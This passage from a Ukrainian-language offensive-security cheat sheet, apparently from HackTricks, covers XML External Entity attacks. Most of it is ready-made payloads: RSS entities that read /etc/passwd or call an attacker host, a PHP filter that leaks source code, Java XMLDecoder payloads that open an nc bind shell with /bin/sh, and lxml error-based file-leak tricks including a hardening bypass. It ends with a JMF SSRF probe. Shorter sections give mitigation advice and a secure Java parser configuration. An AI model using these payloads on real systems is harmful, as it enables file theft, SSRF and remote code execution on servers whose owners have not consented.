<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "http://<AttackIP>/rssXXE" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>XXE Test Blog</title>
<link>http://example.com/</link>
<description>XXE Test Blog</description>
<lastBuildDate>Mon, 02 Feb 2015 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>Test Post</description>
<author>author@example.com</author>
<pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### Прочитати файл
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### Читання вихідного коду

Використання фільтра PHP base64
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
## Java XMLDecoder XEE to RCE

XMLDecoder - це клас Java, який створює об'єкти на основі XML-повідомлення. Якщо зловмисник зможе змусити додаток використовувати довільні дані в виклику методу **readObject**, він миттєво отримає виконання коду на сервері.

### Using Runtime().exec()
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<object class="java.lang.Runtime" method="getRuntime">
<void method="exec">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
</void>
</object>
</java>
```
### ProcessBuilder
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
<void method="start" id="process">
</void>
</void>
</java>
```
## XXE + WrapWrap + Lightyear + обходи

Подивіться на цей дивовижний звіт [https://swarm.ptsecurity.com/impossible-xxe-in-php/](https://swarm.ptsecurity.com/impossible-xxe-in-php/)

## Інструменти

{{#ref}}
https://github.com/luisfontes19/xxexploiter
{{#endref}}

### Python lxml Параметр-Ентіті XXE (Витік файлів на основі помилок)

> [!INFO]
> Бібліотека Python **lxml** використовує **libxml2** під капотом. Версії до **lxml 5.4.0 / libxml2 2.13.8** все ще розширюють *параметр* ентіті, навіть коли `resolve_entities=False`, що робить їх доступними, коли програма активує `load_dtd=True` і/або `resolve_entities=True`. Це дозволяє використовувати навантаження XXE на основі помилок, які вбудовують вміст локальних файлів у повідомлення про помилку парсера.

#### 1. Використання lxml < 5.4.0
1. Визначте або створіть *локальний* DTD на диску, який визначає **невизначену** параметр ентіті (наприклад, `%config_hex;`).
2. Сформуйте внутрішній DTD, який:
* Завантажує локальний DTD з `<!ENTITY % local_dtd SYSTEM "file:///tmp/xml/config.dtd">`.
* Перевизначає невизначену ентіті так, щоб вона:
- Читала цільовий файл (`<!ENTITY % flag SYSTEM "file:///tmp/flag.txt">`).
- Створювала іншу параметр ентіті, яка посилається на **недійсний шлях**, що містить значення `%flag;` і викликає помилку парсера (`<!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///aaa/%flag;'>">`).
3. Нарешті, розширте `%local_dtd;` і `%eval;`, щоб парсер натрапив на `%error;`, не зміг відкрити `/aaa/<FLAG>` і витікнув прапор всередині викинутої виняткової ситуації – що часто повертається користувачу програмою.
```xml
<!DOCTYPE colors [
<!ENTITY % local_dtd SYSTEM "file:///tmp/xml/config.dtd">
<!ENTITY % config_hex '
<!ENTITY % flag SYSTEM "file:///tmp/flag.txt">
<!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///aaa/%flag;'>">
%eval;'>
%local_dtd;
]>
```
Коли додаток виводить виключення, відповідь містить:
```
Error : failed to load external entity "file:///aaa/FLAG{secret}"
```
> [!TIP]
> Якщо парсер скаржиться на символи `%`/`&` всередині внутрішнього підмножини, подвоюйте їх кодування (`&#x26;#x25;` ⇒ `%`), щоб затримати розширення.

#### 2. Обхід зміцнення lxml 5.4.0 (libxml2 все ще вразливий)
`lxml` ≥ 5.4.0 забороняє *параметр* сутності помилок, як у наведеному вище прикладі, але **libxml2** все ще дозволяє їх вбудовувати в *загальну* сутність. Трюк полягає в тому, щоб:
1. Прочитати файл у параметричну сутність `%file`.
2. Оголосити іншу параметричну сутність, яка створює **загальну** сутність `c`, чий системний ідентифікатор використовує *неіснуючий протокол*, наприклад, `meow://%file;`.
3. Розмістити `&c;` в тілі XML. Коли парсер намагається розіменувати `meow://…`, він зазнає невдачі і відображає повний URI – включаючи вміст файлу – в повідомленні про помилку.
```xml
<!DOCTYPE colors [
<!ENTITY % a '
<!ENTITY % file SYSTEM "file:///tmp/flag.txt">
<!ENTITY % b "<!ENTITY c SYSTEM 'meow://%file;'>">
'>
%a; %b;
]>
<colors>&c;</colors>
```
#### Ключові висновки
* **Параметричні сутності** все ще розширюються libxml2, навіть коли `resolve_entities` має блокувати XXE.
* **Недійсний URI** або **неіснуючий файл** достатні для конкатенації контрольованих даних у викинутому виключенні.
* Техніка працює **без вихідного з'єднання**, що робить її ідеальною для середовищ з суворими фільтрами виходу.

#### Рекомендації щодо пом'якшення
* Оновіть до **lxml ≥ 5.4.0** і переконайтеся, що підлягаюча **libxml2** є **≥ 2.13.8**.
* Вимкніть `load_dtd` та/або `resolve_entities`, якщо це абсолютно не потрібно.
* Уникайте повернення сирих помилок парсера клієнту.

### Приклад зміцнення Java DocumentBuilderFactory

Java-додатки часто парсять XML, використовуючи `DocumentBuilderFactory`. За замовчуванням фабрика **дозволяє розв'язання зовнішніх сутностей**, що робить її вразливою до XXE та SSRF, якщо не встановлені додаткові прапори зміцнення:
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
DocumentBuilder builder = dbf.newDocumentBuilder(); // XXE-prone
```
Приклад безпечної конфігурації:
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();

// Completely forbid any DOCTYPE declarations (best-effort defence)
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

// Disable expansion of external entities
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

// Enable "secure processing" which applies additional limits
dbf.setFeature(javax.xml.XMLConstants.FEATURE_SECURE_PROCESSING, true);

// Defensive extras
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);

DocumentBuilder builder = dbf.newDocumentBuilder();
```
Якщо додаток повинен підтримувати DTD всередині, залишайте `disallow-doctype-decl` вимкненим, але **завжди** залишайте два параметри `external-*-entities` встановленими на `false`. Ця комбінація запобігає класичним атакам на розкриття файлів (`file:///etc/passwd`), а також мережевим векторами SSRF (`http://169.254.169.254/…`, протокол `jar:` тощо).

Дослідження реального випадку: **CVE-2025-27136** в емуляторі Java S3 *LocalS3* використовував вразливий конструктор, показаний вище. Неавтентифікований зловмисник міг надати підготовлене XML тіло до кінцевої точки `CreateBucketConfiguration` і змусити сервер вбудувати локальні файли (наприклад, `/etc/passwd`) у HTTP-відповідь.

### XXE в JMF/Послуги Оркестрації Друку → SSRF

Деякі платформи для друку/оркестрації відкривають мережевий прослуховувач формату повідомлень завдань (JMF), який приймає XML через TCP. Якщо підлягаючий парсер приймає `DOCTYPE` і вирішує зовнішні сутності, ви можете використати класичний XXE, щоб змусити сервер здійснювати вихідні запити (SSRF) або отримувати доступ до локальних ресурсів.

Ключові моменти, зафіксовані в реальному світі:
- Мережевий прослуховувач (наприклад, клієнт JMF) на виділеному порту (зазвичай 4004 у Xerox FreeFlow Core).
- Парсинг XML на базі Java всередині jar (наприклад, `jmfclient.jar`) без вимкнення `disallow-doctype-decl` або вирішення сутностей.
- Вихідні зворотні виклики надійно підтверджують експлуатацію.

Мінімальний JMF-стиль SSRF пробник (структура варіюється в залежності від продукту, але DOCTYPE має значення):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE JMF [
<!ENTITY probe SYSTEM "http://attacker-collab.example/oob">
]>
<JMF SenderID="hacktricks" Version="1.3" TimeStamp="2025-08-13T10:10:10Z">
<Query Type="KnownMessages">&probe;</Query>
</JMF>
```
Примітки:
- Замініть URL-адресу сутності на вашу співпрацю. Якщо SSRF можливий, сервер вирішить його під час парсингу повідомлення.
- Посилення, на які слід звернути увагу: `disallow-doctype-decl=true`, `external-general-entities=false`, `external-parameter-entities=false`.
- Навіть коли порт JMF не обслуговує файли, SSRF можна з'єднати для внутрішньої розвідки або для доступу до API управління, прив'язаних до localhost.

Посилання на цей вектор наведені в кінці сторінки.

## Посилання

- [OffSec Blog – CVE-2025-27136 LocalS3 XXE](https://www.offsec.com/blog/cve-2025-27136/)

- [https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)
- [https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)
- Витягти інформацію через HTTP, використовуючи власний зовнішній DTD: [https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/](https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection)
- [https://gist.github.com/staaldraad/01415b990939494879b4](https://gist.github.com/staaldraad/01415b990939494879b4)
- [https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9](https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9)
- [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)
- [https://gosecure.github.io/xxe-workshop/#7](https://gosecure.github.io/xxe-workshop/#7)

- [Dojo CTF Challenge #42 – Hex Color Palette XXE write-up](https://www.yeswehack.com/dojo/dojo-ctf-challenge-winners-42)
- [lxml bug #2107279 – Parameter-entity XXE still possible](https://bugs.launchpad.net/lxml/+bug/2107279)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core XXE/SSRF + Path Traversal)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox FreeFlow Core Security Guide (architecture/ports)](https://securitydocs.business.xerox.com/wp-content/uploads/2025/03/Security-Guide-Information-Assurance-Disclosure-Xerox-FreeFlow-Core-8.0.pdf)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)

{{#include ../banners/hacktricks-training.md}}
